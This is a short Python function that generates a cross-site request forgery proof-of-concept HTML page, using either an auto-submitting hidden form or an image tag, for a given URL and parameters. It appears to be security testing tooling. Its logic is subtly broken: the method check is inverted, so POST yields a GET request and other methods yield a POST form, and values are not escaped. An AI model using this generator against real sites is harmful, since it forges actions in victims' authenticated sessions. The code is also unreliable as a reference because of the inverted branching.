def generate_csrf_poc(url, method, params):
    inputs = ""
    
    for k, v in params.items():
        inputs += f'<input type="hidden" name="{k}" value="{v}">\n'
    if method.upper() == "POST":
        return f"""<html>
<body>
<img src="{url}?{'&'.join(f'{k}={v}' for k,v in params.items())}">
</body>
</html>"""

    return f"""<html>
<body>
<form action="{url}" method="POST">
{inputs}
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>"""